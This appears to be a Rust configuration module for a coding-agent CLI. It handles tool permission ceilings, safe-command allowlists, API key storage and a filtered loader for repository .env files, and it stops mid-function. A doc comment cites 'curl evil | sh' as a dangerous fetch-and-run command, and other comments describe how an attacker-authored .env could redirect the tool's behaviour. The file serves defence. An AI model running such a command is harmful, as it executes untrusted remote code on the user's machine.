//! CLI configuration management.

use leviath_mcp::MCPServerConfig;
use leviath_providers::ModelCapabilityOverride;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;

// Sections of the former single-file config, one per `[table]` it describes.
// Glob re-exported so every existing `config::SecurityConfig` path keeps
// working and the split stays a pure move.
mod limits;
pub use limits::*;
mod policy;
pub use policy::*;
mod providers;
pub use providers::*;
mod security;
pub use security::*;

/// Record every dotted path in `found` that is missing from `kept`.
///
/// `kept` is what survived a deserialize/serialize round trip, so a path that
/// is absent from it is one nothing read. Recurses only where both sides are
/// tables: a value serde rewrote (an enum, a duration) is still a value it
/// understood, and only the *keys* are being judged here.
fn collect_dropped_keys(
    found: &toml::value::Table,
    kept: &toml::value::Table,
    prefix: &str,
    out: &mut Vec<String>,
) {
    for (key, value) in found {
        let path = if prefix.is_empty() {
            key.clone()
        } else {
            format!("{prefix}.{key}")
        };
        match kept.get(key) {
            None => out.push(path),
            Some(kept_value) => {
                if let (Some(found_table), Some(kept_table)) =
                    (value.as_table(), kept_value.as_table())
                {
                    collect_dropped_keys(found_table, kept_table, &path, out);
                }
            }
        }
    }
}

/// CLI configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    /// Default provider
    #[serde(default = "default_provider_name")]
    pub default_provider: String,

    /// Provider API keys
    #[serde(default)]
    pub providers: ProviderConfig,

    /// Agent project paths
    #[serde(default)]
    pub agent_paths: Vec<PathBuf>,

    /// OpenRouter API key
    #[serde(default)]
    pub openrouter_api_key: Option<String>,

    /// Ollama base URL (default http://localhost:11434)
    #[serde(default)]
    pub ollama_base_url: Option<String>,

    /// MCP server configurations
    #[serde(default)]
    pub mcp_servers: Vec<MCPServerConfig>,

    /// Default model override
    #[serde(default)]
    pub default_model: Option<String>,

    /// Per-model capability overrides. Key is model ID (e.g. "my-local-llama").
    /// Takes precedence over the provider's built-in capability table.
    #[serde(default)]
    pub model_capabilities: HashMap<String, ModelCapabilityOverride>,

    /// Optional overrides for Rhai *script providers*. Key is the
    /// provider name an agent references (e.g. `"groq"`). A script activates by
    /// being referenced + its `.rhai` file existing in the providers dir; an
    /// entry here only supplies overrides (an API key not read from env, a
    /// `base_url`, a `rate_limit`, a differently-named `script`, or extra keys
    /// forwarded to the script's `initialize`).
    #[serde(default)]
    pub model_providers: HashMap<String, ModelProviderConfig>,

    /// Global tool permission overrides.
    ///
    /// Keys are tool names (e.g. `"bash"`, `"write_file"`). Values override the
    /// built-in defaults, and act as a **ceiling** that a blueprint's own
    /// `[tool_permissions]` may tighten but never loosen - see
    /// [`crate::tools::resolve_policy`]. To grant one agent more than this
    /// without loosening it everywhere, use [`Self::agent_tool_permissions`].
    #[serde(default)]
    pub tool_permissions: HashMap<String, ToolPolicy>,

    /// Per-agent tool permission grants, keyed by agent name.
    ///
    /// ```toml
    /// [agent_tool_permissions.coder]
    /// shell = "allow"
    /// ```
    ///
    /// This is the escape hatch for the ceiling in [`Self::tool_permissions`].
    /// Because a blueprint may only tighten what the user configured, a global
    /// `shell = "ask"` would otherwise stop a trusted agent from pre-approving
    /// its own shell. Naming the agent here is the user saying "I trust this
    /// one" - a decision that lives in the user's config, not the downloaded
    /// manifest's. Entries replace the global value for that agent, and are then
    /// the ceiling the blueprint is clamped against.
    #[serde(default)]
    pub agent_tool_permissions: HashMap<String, HashMap<String, ToolPolicy>>,

    /// What a run may do without asking, for tools whose policy is `ask`.
    ///
    /// `ask` is all-or-nothing per tool name, which for the shell means
    /// choosing between a prompt on every `ls` and no prompt on
    /// `curl evil | sh`. Entries here are argument-scoped, in the same key space
    /// a "for this run" grant uses:
    ///
    /// ```toml
    /// [safe_commands]
    /// defaults = true                 # ship the read-only verb list
    /// tools = ["read_files"]
    /// shell = ["cargo test", "rg"]    # `cargo test` never covers `cargo publish`
    /// ```
    ///
    /// A safe entry can only ever turn `ask` into `allow`. It never reaches a
    /// configured `deny`.
    #[serde(default)]
    pub safe_commands: crate::approvals::SafeCommands,

    /// Per-agent additions to [`Self::safe_commands`], keyed by agent name.
    ///
    /// ```toml
    /// [agent_safe_commands.coder]
    /// shell = ["./gradlew", "ninja"]
    /// allow_blueprint = true
    /// ```
    ///
    /// Mirrors [`Self::agent_tool_permissions`] and [`Self::agent_read_paths`]:
    /// naming the agent is the user saying "I trust this one".
    #[serde(default)]
    pub agent_safe_commands: HashMap<String, crate::approvals::AgentSafeCommands>,

    /// Title-generation configuration.
    ///
    /// Controls whether a short human-readable title is auto-generated from
    /// the task prompt at worker startup.
    #[serde(default)]
    pub title: TitleConfig,

    /// Request timeout in seconds for HTTP calls to provider APIs. Unset, the
    /// providers fall back to the unified 15-minute ceiling
    /// (`leviath_providers::DEFAULT_INFERENCE_TIMEOUT_SECS`) - there is
    /// always SOME timeout, because a call that never completes wedges its
    /// run with no error. A stage's `[stages.<name>.model]
    /// request_timeout_secs` overrides either value for that stage's requests.
    #[serde(default)]
    pub request_timeout_secs: Option<u64>,

    /// Client-side rate limits for the built-in providers, keyed by provider
    /// name (`anthropic`, `openai`, `google`, `openrouter`).
    ///
    /// ```toml
    /// [rate_limits.anthropic]
    /// requests_per_minute = 50
    /// tokens_per_minute = 40000
    /// ```
    ///
    /// Script providers configure theirs via
    /// `[model_providers.<name>] rate_limit` instead.
    #[serde(default)]
    pub rate_limits: HashMap<String, leviath_providers::RateLimitConfig>,

    /// Global master switch for taint tracking / data-flow enforcement.
    ///
    /// **Off by default (opt-in).** When `true`, every agent enforces taint
    /// tracking by default; individual agents or stages can opt out via a
    /// `[security] taint_tracking = false` block. When `false`, an agent still
    /// opts *in* by setting `taint_tracking = true` in its own `[security]`.
    #[serde(default)]
    pub taint_tracking: bool,

    /// Runtime resource limits (inference concurrency + iteration caps).
    #[serde(default)]
    pub limits: LimitsConfig,

    /// Global master switch for the batch-tool-calls system-prompt hint.
    ///
    /// **On by default (opt-out).** When `true`, every stage's request carries a
    /// short hint telling the model it may emit several `tool_use` blocks in one
    /// response and should batch *independent* operations (but never dependent
    /// ones) to cut API round trips. Individual agents or stages can opt out by
    /// setting `batch_tool_hint = false` in their `[agent]` / `[stages.<name>]`
    /// blocks; when this global is `false`, they opt back *in* by setting it to
    /// `true` at the narrower scope.
    #[serde(default = "default_true")]
    pub batch_tool_hint: bool,

    /// Global master switch for the platform shell hint.
    ///
    /// **On by default (opt-out).** When `true`, a stage that advertises the
    /// `shell` tool carries a short system block describing the shell it will
    /// actually get, so the model doesn't spend iterations discovering it. The
    /// hint is emitted only where the platform warrants one (today: Windows,
    /// where commands run through `cmd.exe /C` rather than a POSIX shell), so
    /// on Linux and macOS this toggle costs nothing either way. Individual
    /// agents or stages override it with `shell_hint` in their `[agent]` /
    /// `[stages.<name>]` blocks.
    #[serde(default = "default_true")]
    pub shell_hint: bool,

    /// Machine-wide defaults for the empty-response nudge (`[nudge]`): the
    /// `[System]` message injected when a stage's model replies with text
    /// before making any tool call. All three keys (`enabled`, `max`, `text`)
    /// are optional; an agent's `[agent.nudge]` or a stage's
    /// `[stages.<name>.nudge]` overrides each field independently. See
    /// [`leviath_core::resolve_nudge`].
    #[serde(default)]
    pub nudge: leviath_core::NudgeConfig,

    /// Completion-webhook delivery tuning (retry/backoff/timeout).
    #[serde(default)]
    pub webhook: WebhookConfig,

    /// Structured observability export (OpenTelemetry). Off by default; when
    /// enabled the daemon exports run/stage/inference/tool spans, metrics, and
    /// trace-correlated log records for every agent run. The standard
    /// `OTEL_EXPORTER_OTLP_ENDPOINT` / `OTEL_SERVICE_NAME` env vars fill any
    /// hole the file leaves, same as the provider keys.
    #[serde(default)]
    pub observability: ObservabilityConfig,

    /// Machine-wide default sandbox for tool execution. An agent's own
    /// `[sandbox]` (or a stage's) overrides this; when unset, agents run tools
    /// on the host unless they opt in themselves. See
    /// [`leviath_core::resolve_sandbox`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sandbox: Option<leviath_core::ToolSandboxConfig>,

    /// Per-host-function permissions for Rhai script tools (Layer 3). Gates what
    /// a registered script tool may *do* (network, shell, file, env access).
    #[serde(default)]
    pub tool_script_permissions: ScriptToolPermissions,

    /// Machine-wide security switches that aren't part of the per-tool
    /// permission cascade. (The global taint master switch stays the top-level
    /// [`Self::taint_tracking`] key for back-compat.)
    #[serde(default)]
    pub security: SecurityConfig,

    /// Per-agent read grants, keyed by agent name - the itemized counterpart
    /// of [`SecurityConfig::allow_blueprint_read_paths`], analogous to
    /// [`Self::agent_tool_permissions`]:
    ///
    /// ```toml
    /// [agent_read_paths.cto]
    /// allow = ["~/.leviath/runs", "glob:~/design-docs/**"]
    /// ```
    ///
    /// Naming the agent here is the user saying "I trust this one to read
    /// these" - a decision that lives in the user's config, not the
    /// downloaded manifest. As with `[security] read_paths`, a grant only
    /// takes effect for a path the blueprint also declares.
    #[serde(default)]
    pub agent_read_paths: HashMap<String, ReadPathGrants>,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            default_provider: "anthropic".to_string(),
            providers: ProviderConfig {
                anthropic_api_key: None,
                openai_api_key: None,
                google_api_key: None,
                anthropic_base_url: None,
                openai_base_url: None,
                google_base_url: None,
                openrouter_base_url: None,
                claude_code_enabled: false,
                claude_code_binary: None,
                claude_code_effort: None,
                anthropic_cache_ttl: None,
                fallback_order: Vec::new(),
            },
            agent_paths: Vec::new(),
            openrouter_api_key: None,
            ollama_base_url: None,
            mcp_servers: Vec::new(),
            default_model: None,
            model_capabilities: HashMap::new(),
            model_providers: HashMap::new(),
            tool_permissions: HashMap::new(),
            agent_tool_permissions: HashMap::new(),
            safe_commands: crate::approvals::SafeCommands::default(),
            agent_safe_commands: HashMap::new(),
            title: TitleConfig::default(),
            request_timeout_secs: None,
            rate_limits: HashMap::new(),
            taint_tracking: false,
            limits: LimitsConfig::default(),
            batch_tool_hint: true,
            shell_hint: true,
            nudge: leviath_core::NudgeConfig::default(),
            webhook: WebhookConfig::default(),
            observability: ObservabilityConfig::default(),
            sandbox: None,
            tool_script_permissions: ScriptToolPermissions::default(),
            security: SecurityConfig::default(),
            agent_read_paths: HashMap::new(),
        }
    }
}

impl Config {
    /// The permission ceiling to apply to `agent_name`: the global
    /// `[tool_permissions]` with that agent's `[agent_tool_permissions.<name>]`
    /// entries laid over it.
    ///
    /// Returned by value (rather than as two maps threaded through
    /// [`crate::tools::resolve_policy`]) so the ceiling is resolved exactly once,
    /// at spawn, and every later lookup reads a single flat map.
    pub fn permissions_for_agent(&self, agent_name: &str) -> HashMap<String, ToolPolicy> {
        let mut merged = self.tool_permissions.clone();
        if let Some(per_agent) = self.agent_tool_permissions.get(agent_name) {
            merged.extend(per_agent.iter().map(|(k, v)| (k.clone(), *v)));
        }
        merged
    }

    /// The safe-command keys in effect for `agent_name`, and where each came
    /// from. Resolved once at spawn, mirroring [`Self::permissions_for_agent`].
    ///
    /// `blueprint` is the manifest's own `[safe_commands]`, which contributes
    /// only when the user opted in - see
    /// [`crate::approvals::resolve_safe_keys`].
    pub fn safe_keys_for_agent(
        &self,
        agent_name: &str,
        blueprint: Option<&leviath_core::blueprint::SafeCommandsConfig>,
    ) -> std::collections::BTreeMap<String, crate::approvals::SafeSource> {
        crate::approvals::resolve_safe_keys(
            &self.safe_commands,
            self.agent_safe_commands.get(agent_name),
            blueprint,
            self.security.allow_blueprint_safe_commands,
        )
    }

    /// Every read-path grant that applies to `agent_name`: the machine-wide
    /// `[security] read_paths` list plus that agent's
    /// `[agent_read_paths.<name>]` entries. Resolved once at spawn, mirroring
    /// [`Self::permissions_for_agent`].
    pub fn read_path_grants_for_agent(&self, agent_name: &str) -> Vec<String> {
        let mut grants = self.security.read_paths.clone();
        if let Some(per_agent) = self.agent_read_paths.get(agent_name) {
            grants.extend(per_agent.allow.iter().cloned());
        }
        grants
    }

    /// Load configuration from the default location (~/.leviath/config.toml).
    ///
    /// After loading from file (or using defaults), environment variables are
    /// checked as fallbacks. Env vars override config file values if set.
    pub fn load() -> anyhow::Result<Self> {
        // In the crate's own test build, refuse to read the *real* environment.
        //
        // `Config::load()` reads process-wide state, and `cargo test` runs tests
        // in parallel threads of one process. `temp_env` serializes its own
        // calls behind a global lock, but a test that reaches this function
        // without going through that lock races every test that holds it - so
        // it sees whatever variables happen to be set or unset at that instant.
        // That is not hypothetical: the `serve` CORS test failed on CI in two
        // different places depending on when it lost the race, each time
        // accusing code that was correct.
        //
        // Making it a hard error rather than an audit means the next test to
        // reach here unisolated fails immediately and locally, with the fix in
        // the message, instead of flaking on someone else's pull request months
        // later.
        #[cfg(test)]
        assert!(
            std::env::var_os("LEVIATH_CONFIG_PATH").is_some(),
            "Config::load() reached from a test that has not isolated the \
             environment. Wrap the test in `config::with_isolated_config_path` \
             (or `..._async`), which both points this at a scratch config and \
             takes the same process-wide lock every other env-touching test \
             holds. Without it this test races them and fails intermittently, \
             somewhere else."
        );

        // Load a `.env` from the current directory only.
        //
        // `dotenvy::dotenv()` searches the cwd *and every ancestor*, which is
        // the wrong shape for a coding agent: `lev` is designed to be run inside
        // cloned repositories, so an untrusted repo's `.env` - or one in any
        // directory above it - was loaded into the process environment. That is
        // load-bearing well beyond provider keys: `PATH` and `SHELL` decide what
        // gets executed, `EDITOR`/`VISUAL` are split and spawned, `OLLAMA_HOST`
        // redirects inference to an attacker's endpoint, `LEVIATH_HOME`
        // relocates the directories agent scripts are discovered from, and
        // `LEVIATH_API_TOKEN` sets a known credential on the agent-spawning API.
        //
        // `from_filename` reads only `./.env`, one directory the user chose
        // rather than an unbounded walk up the tree. That narrowed the blast
        // radius without closing it: a cloned repository *is* the working
        // directory, so `./.env` is still attacker-authored on any repo the user
        // did not write.
        //
        // dotenvy does not override an already-set variable, which covers `PATH`
        // and `HOME` in practice - but not a variable that is normally unset,
        // and those are the ones that matter. A single line of
        // `LEVIATH_CONFIG_PATH=./.leviath.toml` makes the next statement read an
        // attacker's config: their `[mcp_servers]` commands, their
        // `[tool_permissions]`, their provider `base_url`. So the names that
        // steer the process are filtered out, and the credentials this feature
        // exists to load are not. See `leviath_core::dotenv_var_allowed`.
        //
        // `LEVIATH_SKIP_DOTENV` lets tests isolate `Config::load()` completely.
        if std::env::var_os("LEVIATH_SKIP_DOTENV").is_none() {
            load_dotenv_filtered(".env");
        }

        let config = Self::load_from_path(&Self::config_path())?;

        // Check config file permissions on Unix
        check_permissions();

        Ok(config)
    }

    /// Say so when the config file holds a key nothing reads.
    ///
    /// Serde ignores unknown fields, so a misspelled or long-removed table sat
    /// in `config.toml` doing nothing and saying nothing - `[cache] ttl` being
    /// the reported case (#362). A warning rather than a hard error on
    /// purpose: a blueprint is authored and validated deliberately, but this
    /// file is long-lived and read by *every* command, so refusing to load it
    /// over one stale key would take the whole CLI down rather than the one
    /// thing that key was meant to affect.
    ///
    /// Reported at every depth, so `[limits] max_concurrent_tool` is named as
    /// readily as a whole unknown table (#365).
    fn warn_unknown_config_keys(content: &str) {
        let unknown = Self::unknown_config_keys(content);
        if !unknown.is_empty() {
            // Joined before the macro, not inside it: a field expression only
            // runs when a subscriber is interested at the callsite, so as an
            // argument this read as uncovered under the 100% gate however the
            // test installed its subscriber.
            let keys = unknown.join(", ");
            tracing::warn!(
                %keys,
                "config.toml has keys nothing reads; they are being ignored. \
                 `lev doctor` reports them too, if this scrolls past."
            );
        }
    }

    /// Keys in the config file at `path` that nothing reads.
    ///
    /// The same answer the start-up warning gives, available to anyone who
    /// wants to *ask* rather than having to catch it scrolling past - which is
    /// what `lev doctor` does with it. An unreadable or absent file has no
    /// unread keys, because that is a different problem and one the caller has
    /// already reported.
    pub fn unread_keys_at(path: &std::path::Path) -> Vec<String> {
        std::fs::read_to_string(path)
            .map(|content| Self::unknown_config_keys(&content))
            .unwrap_or_default()
    }

    /// The decision behind [`Self::warn_unknown_config_keys`], as data.
    ///
    /// Split out because the warning-shaped version could only be tested by
    /// asserting the config still loaded, which it does whether or not a single
    /// key is ever reported - the first version of this shipped a `parse` that
    /// silently returned early on every real config, and that test passed
    /// anyway.
    ///
    /// `toml::from_str::<Table>` and not `content.parse::<toml::Value>()`: the
    /// latter parses a bare TOML *value*, so a document failed at the first
    /// `=` and this returned empty every time.
    ///
    /// # How a key is judged unknown
    ///
    /// By asking serde, rather than by consulting a list somebody has to
    /// remember to update: deserialize the file into [`Config`], serialize that
    /// straight back to TOML, and report any path in the input that did not
    /// survive the round trip. Serde keeps what it understands and drops what
    /// it does not, so the round trip *is* the definition of "read".
    ///
    /// Three things fall out of that for free:
    ///
    /// - It works at any depth, without knowing the shape of anything.
    /// - It stays true as fields come and go, with nothing to maintain.
    /// - It respects `#[serde(flatten)]`. `[model_providers.<name>]`
    ///   deliberately absorbs unrecognised keys and forwards them to a Rhai
    ///   script, and those keys round-trip, so they are not reported. Where
    ///   serde keeps the data, this stays quiet.
    ///
    /// An earlier attempt compared against `Config::default()` instead, which
    /// was wrong in a way worth recording: TOML cannot represent null, so every
    /// `Option` still at `None` vanishes from the *default's* serialized form
    /// and five real keys read as unknown. Round-tripping the user's own config
    /// does not have that problem, because a field they set is a field that
    /// serializes.
    fn unknown_config_keys(content: &str) -> Vec<String> {
        let Ok(found) = toml::from_str::<toml::value::Table>(content) else {
            return Vec::new();
        };
        // A file that is TOML but not a config has no *unknown* keys to report
        // - it has a type error, which whoever asked for it reports instead.
        let Ok(config) = toml::from_str::<Self>(content) else {
            return Vec::new();
        };
        // Infallible, and said with `expect` rather than a branch nothing can
        // reach: every field of `Config` is plain data with a derived
        // `Serialize`, and a struct always serializes to a table.
        let kept = toml::Value::try_from(config).expect("a Config is plain data and serializes");
        let kept = kept.as_table().expect("a struct serializes to a table");

        let mut unknown = Vec::new();
        collect_dropped_keys(&found, kept, "", &mut unknown);
        unknown
    }

    /// Core of `load()`, parameterized by path so it can be exercised in
    /// tests against a tempfile instead of the real `~/.leviath/config.toml`.
    fn load_from_path(path: &std::path::Path) -> anyhow::Result<Self> {
        let mut config = if !path.exists() {
            let path_display = path.display();
            tracing::debug!("No config file found at {}, using defaults", path_display);
            Self::default()
        } else {
            let content = std::fs::read_to_string(path).map_err(|e| {
                anyhow::anyhow!("Failed to read config from '{}': {}", path.display(), e)
            })?;

            let c: Self = toml::from_str(&content)
                .map_err(|e| anyhow::anyhow!("Failed to parse config: {}", e))?;

            Self::warn_unknown_config_keys(&content);

            // Catch a malformed MCP server entry here, at load, rather than at
            // the first tool call: a typo that drops a server's tools should
            // fail loudly and immediately.
            for server in &c.mcp_servers {
                server.validate()?;
            }

            let path_display = path.display();
            tracing::debug!("Loaded config from {}", path_display);
            c
        };

        // Env var fallbacks (env vars override config file if set)
        if config.providers.anthropic_api_key.is_none() {
            config.providers.anthropic_api_key = std::env::var("ANTHROPIC_API_KEY").ok();
        }
        if config.providers.openai_api_key.is_none() {
            config.providers.openai_api_key = std::env::var("OPENAI_API_KEY").ok();
        }
        if config.providers.google_api_key.is_none() {
            config.providers.google_api_key = std::env::var("GOOGLE_API_KEY").ok();
        }
        if config.openrouter_api_key.is_none() {
            config.openrouter_api_key = std::env::var("OPENROUTER_API_KEY").ok();
        }
        // OLLAMA_HOST is the standard env var for Ollama
        if config.ollama_base_url.is_none() {
            config.ollama_base_url = std::env::var("OLLAMA_HOST").ok();
        }
        // The same override without a config file, which is how a machine
        // behind an enterprise gateway is usually set up: the gateway is a
        // property of the host, not of the checkout.
        if config.providers.anthropic_base_url.is_none() {
            config.providers.anthropic_base_url = std::env::var("ANTHROPIC_BASE_URL").ok();
        }
        if config.providers.openai_base_url.is_none() {
            config.providers.openai_base_url = std::env::var("OPENAI_BASE_URL").ok();
        }
        if config.providers.google_base_url.is_none() {
            config.providers.google_base_url = std::env::var("GOOGLE_BASE_URL").ok();
        }
        if config.providers.openrouter_base_url.is_none() {
            config.providers.openrouter_base_url = std::env::var("OPENROUTER_BASE_URL").ok();
        }

        config.fill_from_credential_store();

        Ok(config)
    }

    /// Fill any provider key still unset from the configured credential store.
    fn fill_from_credential_store(&mut self) {
        let resolved = crate::credentials::store_for(self.security.credential_store);
        self.fill_from_credential_store_with(resolved);
    }

    /// Core of [`fill_from_credential_store`](Self::fill_from_credential_store)
    /// with the backend already resolved.
    ///
    /// Runs *after* the file and the environment, so precedence is file > env >
    /// keychain: what the user can see wins over what they cannot. In keychain
    /// mode `lev auth migrate` strips the keys out of the file, so in practice
    /// the keychain is the only source - but a key left behind by hand keeps
    /// working rather than being silently ignored, and `lev auth status` reports
    /// when a secret exists in both places.
    ///
    /// A store that cannot be opened is a warning, not a hard failure. The user
    /// may still have working keys in their environment, and refusing to load
    /// the config at all would take down `lev auth status` - the one command
    /// that can explain what is wrong. The resolution is the caller's so that
    /// path is testable: "no store is installed in this process" is not the same
    /// as "this machine has no keychain", and on a developer's Mac the first
    /// silently becomes the second.
    fn fill_from_credential_store_with(&mut self, resolved: crate::credentials::Resolved) {
        match resolved {
            Ok(Some(store)) => self.apply_credential_store(store.as_ref()),
            // The file backend keeps its keys in this struct already.
            Ok(None) => {}
            Err(e) => {
                tracing::warn!("{e}. Falling back to keys from the config file and environment.");
            }
        }
    }

    /// Overlay `store`'s secrets onto whichever provider keys are still unset.
    fn apply_credential_store(&mut self, store: &dyn leviath_core::CredentialStore) {
        let accounts: Vec<String> = crate::credentials::PROVIDER_KEYS
            .iter()
            .map(|p| leviath_core::provider_account(p))
            .collect();
        let mut found = store.read_all(&accounts);
        let mut take = |provider: &str| found.remove(&leviath_core::provider_account(provider));

        let anthropic = take("anthropic");
        let openai = take("openai");
        let google = take("google");
        let openrouter = take("openrouter");

        self.providers.anthropic_api_key = self.providers.anthropic_api_key.take().or(anthropic);
        self.providers.openai_api_key = self.providers.openai_api_key.take().or(openai);
        self.providers.google_api_key = self.providers.google_api_key.take().or(google);
        self.openrouter_api_key = self.openrouter_api_key.take().or(openrouter);
    }

    /// This config with every provider API key removed.
    ///
    /// What gets serialized in keychain mode: the secrets go to the OS store and
    /// the file keeps only the settings. Returning a stripped copy rather than
    /// mutating in place matters - the caller is usually saving a config it is
    /// still going to use for inference, and blanking its keys would break the
    /// run that triggered the save.
    fn without_secrets(&self) -> Self {
        let mut copy = self.clone();
        copy.providers.anthropic_api_key = None;
        copy.providers.openai_api_key = None;
        copy.providers.google_api_key = None;
        copy.openrouter_api_key = None;
        copy
    }

    /// Every provider key currently set, as `(account, secret)` pairs.
    pub(crate) fn provider_secrets(&self) -> Vec<(String, String)> {
        [
            ("anthropic", self.providers.anthropic_api_key.as_deref()),
            ("openai", self.providers.openai_api_key.as_deref()),
            ("google", self.providers.google_api_key.as_deref()),
            ("openrouter", self.openrouter_api_key.as_deref()),
        ]
        .into_iter()
        .filter_map(|(name, key)| {
            key.map(|k| (leviath_core::provider_account(name), k.to_string()))
        })
        .collect()
    }

    /// Save configuration to a path, parameterized so it can be exercised in
    /// tests against a tempfile instead of the real `~/.leviath/config.toml`.
    /// `pub(crate)` so in-crate callers (e.g. the `setup` wizard) can inject a
    /// path; production writes to [`Self::config_path`].
    pub(crate) fn save_to_path(&self, path: &std::path::Path) -> anyhow::Result<()> {
        // Create parent directory if needed
        if let Some(parent) = path.parent() {
            create_config_dir(parent)?;
        }

        // In keychain mode the secrets belong in the OS store, and the file
        // keeps only the settings - otherwise `lev setup` would helpfully write
        // every key back into `config.toml` and quietly undo the migration.
        //
        // A store that cannot be written is *not* silently downgraded to writing
        // the keys into the file: a user who asked for the keychain would end up
        // with plaintext keys on disk and no indication of it.
        let resolved = crate::credentials::store_for(self.security.credential_store);
        self.write_to(path, resolved)
    }

    /// Core of [`save_to_path`](Self::save_to_path) with the backend already
    /// resolved - see
    /// [`fill_from_credential_store_with`](Self::fill_from_credential_store_with)
    /// for why the resolution is the caller's.
    fn write_to(
        &self,
        path: &std::path::Path,
        resolved: crate::credentials::Resolved,
    ) -> anyhow::Result<()> {
        let to_write = match resolved.map_err(|e| anyhow::anyhow!("{e}"))? {
            Some(store) => {
                for (account, secret) in self.provider_secrets() {
                    store
                        .set(&account, &secret)
                        .map_err(|e| anyhow::anyhow!("failed to store {account}: {e}"))?;
                }
                self.without_secrets()
            }
            None => self.clone(),
        };

        // Config contains only primitive-typed fields; toml serialization is infallible.
        let content =
            toml::to_string_pretty(&to_write).expect("Config serialization is infallible");

        // `write_private`, not `fs::write` + `chmod`. This file holds every
        // provider API key, and the two-step version left it at the umask
        // default (typically 0644) between the write and the mode change - so
        // every save had a moment where any local user could read the keys.
        leviath_sys::write_private(path, content.as_bytes()).map_err(|e| {
            anyhow::anyhow!("Failed to write config to '{}': {}", path.display(), e)
        })?;

        let path_display = path.display();
        tracing::debug!("Saved config to {}", path_display);
        Ok(())
    }

    /// Load a config from an explicit path (`lev mcp` uses this to read the
    /// file it is about to rewrite). Public wrapper over the tested `load_from_path`.
    pub fn load_from_path_public(path: &std::path::Path) -> anyhow::Result<Self> {
        Self::load_from_path(path)
    }

    /// Save a config to an explicit path. Public wrapper over `save_to_path`, for `lev mcp` rewriting the config file.
    pub fn save_to_path_public(&self, path: &std::path::Path) -> anyhow::Result<()> {
        self.save_to_path(path)
    }

    /// Get the path to the config file.
    ///
    /// Two overrides, narrowest first: `LEVIATH_CONFIG_PATH` names this file
    /// exactly, and `LEVIATH_HOME` (via [`leviath_core::data_dir`]) redirects it
    /// along with every other home-relative path.
    ///
    /// Honoring both matters. `LEVIATH_HOME`'s whole purpose is to "redirect
    /// every home-relative path at once" - that is what its doc says and what
    /// tests, sandboxed runs and scratch environments rely on - so a config
    /// path that quietly ignored it would let a run that believes it is
    /// isolated read *and write* the developer's real `~/.leviath/config.toml`,
    /// the file holding every provider API key. Found by doing exactly that
    /// during live testing.
    pub fn config_path() -> PathBuf {
        if let Ok(override_path) = std::env::var("LEVIATH_CONFIG_PATH") {
            return PathBuf::from(override_path);
        }
        leviath_core::data_dir()
            .unwrap_or_default()
            .join("config.toml")
    }

    // Tests for the two overrides live in the `tests` module below; see
    // `config_path_honors_leviath_home`.

    /// Validate API key formats and return warnings for suspicious keys.
    pub fn validate_keys(&self) -> Vec<String> {
        // A blank key means "not configured" (that is what `lev setup` writes
        // for a provider the user skipped), so it earns no warning - warning
        // about the shape of a key nobody set is noise that trains users to
        // ignore the ones that matter.
        let mut warnings = Vec::new();
        if let Some(key) = self.providers.anthropic_api_key.as_deref()
            && !key.trim().is_empty()
            && !key.starts_with("sk-ant-")
        {
            warnings.push(
                "Anthropic API key doesn't start with 'sk-ant-' - verify it's correct".to_string(),
            );
        }
        if let Some(key) = self.providers.openai_api_key.as_deref()
            && !key.trim().is_empty()
            && !key.starts_with("sk-")
        {
            warnings
                .push("OpenAI API key doesn't start with 'sk-' - verify it's correct".to_string());
        }
        warnings
    }
}

/// The canonical `LEVIATH_HOME`-aware resolvers live in
/// [`leviath_core::paths`]; these re-exports keep this crate's established
/// names pointing at that single definition instead of carrying a byte-for-
/// byte copy of it (which is exactly how the override once diverged between
/// components). `Config::config_path()` stays separate: it has its own
/// narrower `LEVIATH_CONFIG_PATH` override above.
pub use leviath_core::paths::home_dir as leviath_home_dir;
pub use leviath_core::paths::providers_dir;

/// Create the config directory with restrictive permissions.
fn create_config_dir(dir: &std::path::Path) -> anyhow::Result<()> {
    std::fs::create_dir_all(dir)
        .map_err(|e| anyhow::anyhow!("Failed to create config directory: {}", e))?;
    set_dir_permissions(dir);
    Ok(())
}

/// Set every variable in `path` that a repository's `.env` is allowed to set,
/// warning once about the rest.
///
/// Matches dotenvy's own precedence: a variable already present in the
/// environment wins, because the person who exported it meant it and a file in
/// a directory they happened to `cd` into did not.
///
/// A missing or unreadable `.env` is not an error - most working directories do
/// not have one.
/// Re-quote an already-parsed value so dotenvy reads it back unchanged.
///
/// Double quotes, not single. Single quotes look right - dotenvy's *value*
/// parser treats everything inside them literally - but its *line reader* is a
/// separate state machine that honours `\` escapes inside single quotes. The
/// two disagree, so a value ending in a backslash ate its own closing quote,
/// swallowed the next line, and failed the whole document. Since the load
/// result is discarded, every variable after it vanished with no warning.
///
/// Inside double quotes both layers agree on the same escape set, so escaping
/// `\`, `"`, `$` and a newline round-trips exactly. Escaping `$` is also what
/// stops a second substitution pass: these values were already `$VAR`-expanded
/// by the parse that produced them.
fn requote(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('"');
    for c in value.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '$' => out.push_str("\\$"),
            '\n' => out.push_str("\\n"),
            other => out.push(other),
        }
    }
    out.push('"');
    out
}

fn load_dotenv_filtered(path: &str) {
    let Ok(entries) = dotenvy::from_filename_iter(path) else {
        return;
    };
    // A malformed line is skipped rather than ending the read, so one bad entry
    // costs its own variable and not every variable after it.
    let (allowed, skipped): (Vec<_>, Vec<_>) = entries
        .flatten()
        .partition(|(key, _)| leviath_core::dotenv_var_allowed(key));

    // Hand the survivors back to dotenvy rather than calling `set_var` here:
    // the workspace forbids `unsafe`, and `std::env::set_var` is unsafe in
    // edition 2024.
    //
    // One path, not a fast path plus a filtered one. Re-reading the file when
    // nothing was filtered looked cheap, but it re-parsed content that could
    // have changed since the decision was made and gave the two paths
    // different error semantics for a malformed line. Always re-serializing
    // means what gets set is exactly what was inspected.
    let doc: String = allowed
        .iter()
        .map(|(key, value)| format!("{key}={}\n", requote(value)))
        .collect();
    let _ = dotenvy::from_read(doc.as_bytes());

    // The common case is that a `.env` sets nothing sensitive, and warning then
    // printed "Ignoring  from .env" with an empty list where a name belonged.
    if skipped.is_empty() {
        return;
    }

    // Joined before the macro rather than inside it: `tracing` does not
    // evaluate field expressions when no subscriber is interested, so an
    // argument built in place reads as an unexecuted region even on the run
    // that logged it.
    let names = skipped
        .iter()
        .map(|(key, _)| key.as_str())
